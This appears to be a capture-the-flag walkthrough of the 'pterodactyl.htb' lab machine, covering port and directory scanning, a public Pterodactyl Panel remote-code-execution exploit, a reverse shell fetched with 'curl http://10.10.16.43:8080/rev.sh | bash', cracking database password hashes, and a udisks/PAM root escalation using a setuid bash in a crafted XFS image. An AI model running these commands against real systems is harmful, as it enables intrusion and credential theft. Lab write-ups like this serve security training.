### Nmap Scan
```
nmap -sV -sC -vv 10.129.1.157

---OUTPUT---
Nmap scan report for 10.129.1.157
Host is up, received echo-reply ttl 63 (0.027s latency).
Scanned at 2026-02-12 05:55:41 EST for 14s
Not shown: 984 filtered tcp ports (no-response), 12 filtered tcp ports (admin-prohibited)
PORT     STATE  SERVICE    REASON         VERSION
22/tcp   open   ssh        syn-ack ttl 63 OpenSSH 9.6 (protocol 2.0)
| ssh-hostkey: 
|   256 a3:74:1e:a3:ad:02:14:01:00:e6:ab:b4:18:84:16:e0 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOouXDOkVrDkob+tyXJOHu3twWDqor3xlKgyYmLIrPasaNjhBW/xkGT2otP1zmnkTUyGfzEWZGkZB2Jkaivmjgc=
|   256 65:c8:33:17:7a:d6:52:3d:63:c3:e4:a9:60:64:2d:cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIJTXNuX5oJaGQJfvbga+jM+14w5ndyb0DN0jWJHQCDd9
80/tcp   open   http       syn-ack ttl 63 nginx 1.21.5
|_http-server-header: nginx/1.21.5
|_http-title: Did not follow redirect to http://pterodactyl.htb/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
443/tcp  closed https      reset ttl 63
8080/tcp clo.sed http-proxy reset ttl 63
```
## Port 80
- Add to /etc/hosts : `pterodactyl.htb`
![[Pasted image 20260212061014.png]]

### Gobuster
```
gobuster dir -u http://pterodactyl.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip

gobuster dir -u http://pterodactyl.htb/Public/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip

gobuster dir -u http://play.pterodactyl.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,zip -b 302

---OUTPUT-1---
index.php            (Status: 200) [Size: 1686]
changelog.txt        (Status: 200) [Size: 920]
Public               (Status: 301) [Size: 169] [--> http://pterodactyl.htb/Public/]
phpinfo.php          (Status: 200) [Size: 73007]

```

### Accessing phpinfo page:
`http://pterodactyl.htb/phpinfo.php`
![[Pasted image 20260212082826.png]]

### Ffuf 

```
ffuf -u http://pterodactyl.htb/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt   -H "Host:FUZZ.pterodactyl.htb" -fw 3

---OUTPUT---
        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://pterodactyl.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt
 :: Header           : Host: FUZZ.pterodactyl.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 3
________________________________________________

panel                   [Status: 200, Size: 1897, Words: 490, Lines: 36, Duration: 454ms]
:: Progress: [20481/20481] :: Job [1/1] :: 3076 req/sec :: Duration: [0:00:07] :: Errors: 0 ::
```

### Pterodactyl Panel
- Add `panel.pterodactyl.htb` to /etc/hosts
![[Pasted image 20260212083751.png]]

### Searchsploit 
- searching pterodactyl gives and RCE exploit:
```
searchsploit pterodactyl              
-------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                              |  Path
-------------------------------------------------------------------------------------------- ---------------------------------
Pterodactyl Panel 1.11.11 - Remote Code Execution (RCE)                                     | multiple/webapps/52341.py
-------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
Using this exploit I grabbed a shell:
https://github.com/malw0re/CVE-2025-49132---Pterodactyl-RCE-HTB-Season-10-

```
python3 exploit2.py --host panel.pterodactyl.htb --interactive
```
- This exploit also replaces spaces with `${IFS}` which allows us to pass our commands:
```
curl http://10.10.16.43:8080/rev.sh | bash
```
- With python server on 8080 it grabs my rev script and executes it for me to get a shell:(with nc or penelope)
![[Pasted image 20260212110433.png]]
![[Pasted image 20260212110446.png]]

![[Pasted image 20260212110403.png]]

- I grab the user flag:
![[Pasted image 20260212110520.png]]

## Privilege Escalation:
- Can log in to mysql to grab hash:
```
mysql -h 127.0.0.1 -u pterodactyl -p panel
> PteraPanel

>
> select username,password from users;
```
![[Pasted image 20260212115100.png]]
![[Pasted image 20260212121138.png]]

![[Pasted image 20260212121237.png]]
- One of the hashes gives me a pwd to jump to user phileasfogg3
```
john hash1 --wordlist=/usr/share/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!QAZ2wsx         (?)     
1g 0:00:01:02 DONE (2026-02-12 12:28) 0.01608g/s 223.4p/s 223.4c/s 223.4C/s aldrich..superpet
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

- I login as user phileasfogg3
```
su phileasfogg3
> !QAZ2wsx
```

- Can also log into panel with these credentials:
  ![[Pasted image 20260212123802.png]]

### Linpeas
- Looking at linpeas I see there is a mail `/var/spool/mail`
- Reading `phileasfogg3`'s mail I find something interesting:
```
rom headmonitor@pterodactyl Fri Nov 07 09:15:00 2025
Delivered-To: phileasfogg3@pterodactyl
Received: by pterodactyl (Postfix, from userid 0)
id 1234567890; Fri, 7 Nov 2025 09:15:00 +0100 (CET)
From: headmonitor headmonitor@pterodactyl
To: All Users all@pterodactyl
Subject: SECURITY NOTICE — Unusual udisksd activity (stay alert)
Message-ID: 202511070915.headmonitor@pterodactyl
Date: Fri, 07 Nov 2025 09:15:00 +0100
MIME-Version: 1.0
Content-Type: text/plain; charset="utf-8"
Content-Transfer-Encoding: 7bit

Attention all users,

Unusual activity has been observed from the udisks daemon (udisksd). No confirmed compromise at this time, but increased vigilance is required.

Do not connect untrusted external media. Review your sessions for suspicious activity. Administrators should review udisks and system logs and apply pending updates.

Report any signs of compromise immediately to headmonitor@pterodactyl.htb

— HeadMonitor
System Administrator
```
![[Pasted image 20260213063234.png]]

- Looking online i see a CVE to privilege escalate via udisks2 daemon: https://cdn2.qualys.com/2025/06/17/suse15-pam-udisks-lpe.txt
- I need to exploit two CVE's : CVE-2025-6018-6018 and CVE-2025-6018-6019
- For 6018 I partially follow this exploit : https://github.com/DesertDemons/CVE-2025-6018-6019/tree/main
- Following the steps I manage to escalate my user with  root privileges:
	- First create the xfs.image file on local machine:
```
> dd if=/dev/zero of=./xfs.image bs=1M count=300
> mkfs.xfs ./xfs.image

> mkdir ./xfs.mount

> mount -t xfs ./xfs.image ./xfs.mount

> cp /bin/bash ./xfs.mount

> chmod 04555 ./xfs.mount/bash

> umount ./xfs.mount

> scp -i id_ed25519 ./xfs.image phileasfogg3@10.129.2.85:/tmp/
> (enter pwd)
```
- Then using 6018 CVE exploit I do stage2 (and logout and back in) to set the PAM configuration:
```
./exploit.sh stage2
logout
ssh phileasfogg3@10.129.2.85
> (Enter pwd)
```

- Then I check if everything is set right (should get a (yes) output):
```
gdbus call --system --dest org.freedesktop.login1 --object-path /org/freedesktop/login1 --method org.freedesktop.login1.Manager.CanReboot

----
('yes',)
```
![[Pasted image 20260213070229.png]]
- We request the udisks daemon to resize our XFS filesystem, whichforces the libblockdev to mount it in /tmp without the nosuid and nodevflags, but we first run a tight loop that will keep our XFS filesystem busy and prevent it from being unmounted later by the libblockdev:
- Then kill any process if running:
```
killall -KILL gvfs-udisks2-volume-monitor
```
- Then start our process with the image we created and sent to target
```
udisksctl loop-setup --file ./xfs.image --no-user-interaction
```
![[Pasted image 20260213070353.png]]
- Pass the command (will respond in error, its expected):
```
gdbus call --system --dest org.freedesktop.UDisks2 --object-path /org/freedesktop/UDisks2/block_devices/loop0 --method org.freedesktop.UDisks2.Filesystem.Resize 0 '{}'
Error: GDBus.Error:org.freedesktop.UDisks2.Error.Failed: Error resizing filesystem on /dev/loop0: Failed to unmount '/dev/loop0' after resizing it: target is busy
```

- If you check ls-al you'll see our bsah file:
![[Pasted image 20260213070517.png]]
- Can check mount to confirm:
```
mount

---RELEVANT OUTPUT---
/dev/loop0 on /tmp/blockdev.5AVMK3 type xfs (rw,relatime,attr2,inode64,logbufs=8,logbsize=32k,noquota)
```
- Finally we can mount it and run bash making out user get root privileges (euid):
```
/tmp/blockdev*/bash -p
```
- We should now have root privileges (and act as user root):
![[Pasted image 20260213070820.png]]
- Can grab root flag:
![[Pasted image 20260213070846.png]]